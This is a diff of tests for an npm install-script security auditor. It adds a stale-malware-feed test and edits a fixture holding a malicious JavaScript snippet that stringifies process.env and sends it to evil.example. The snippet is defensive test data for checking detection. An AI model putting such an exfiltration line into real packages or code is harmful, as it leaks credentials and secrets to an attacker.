@@ -575,7 +575,48 @@ def test_fail_open_missing_feed_is_visible_and_cannot_create_offline_approval(tm
     assert report.entries[0].verdict == "review"
     assert "malware-tier-unavailable" in report.entries[0].reasons
     assert any("malware feed is missing" in warning for warning in report.warnings)
+    assert any("ca9 feed update" in warning for warning in report.warnings)
     assert "npm approve-scripts native-lib" not in scripts_audit_report_to_commands(report)
+
+
+def test_stale_feed_still_denies_known_malware_and_warns(tmp_path):
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    _write_lock(repo, {"native-lib": _lock_entry("native-lib", "1.0.0")})
+    _write_node_module(repo, "native-lib", "1.0.0", {"install": "node-gyp rebuild"})
+    now = datetime.now(timezone.utc)
+    bundle_path = tmp_path / "stale-feed.json"
+    bundle_path.write_text(
+        json.dumps(
+            {
+                "schema": "ca9.feed.v1",
+                "created_at": (now - timedelta(days=10)).isoformat(),
+                "expires_at": (now - timedelta(days=3)).isoformat(),
+                "datasets": {
+                    "npm-malware": {
+                        "packages": [{"name": "native-lib", "version": "1.0.0", "id": "MAL-OLD"}]
+                    },
+                    "pypi-malware": {"packages": []},
+                    "npm-releases": {"packages": {}},
+                    "pypi-releases": {"packages": {}},
+                },
+            }
+        )
+    )
+    feed_cache = tmp_path / "cache" / "feed"
+    update_feed_from_source(str(bundle_path), cache_dir=feed_cache)
+
+    report = build_scripts_audit_report(
+        repo,
+        package_policy=PackagePolicy(malware=MalwarePolicy(enabled=True, fail_closed=False)),
+        feed_cache_dir=feed_cache,
+        fetch_artifacts=False,
+    )
+
+    assert report.entries[0].verdict == "deny"
+    assert "feed:MAL-OLD" in report.entries[0].reasons
+    assert any("malware feed is stale" in warning for warning in report.warnings)
+    assert not any("malware tier skipped" in warning for warning in report.warnings)
 
 
 def test_non_native_review_does_not_claim_native_evidence_is_missing(tmp_path):
@@ -758,7 +799,7 @@ def test_node_modules_manifest_does_not_bypass_artifact_code_analysis(tmp_path):
     repo.mkdir()
     tarball = repo / "native-lib.tgz"
     malicious_js = (
-        b"const token = process.env.NPM_TOKEN; "
+        b"const token = JSON.stringify(process.env); "
         b"require('https').get('https://evil.example/?token=' + token);"
     )
     integrity = _write_tarball(
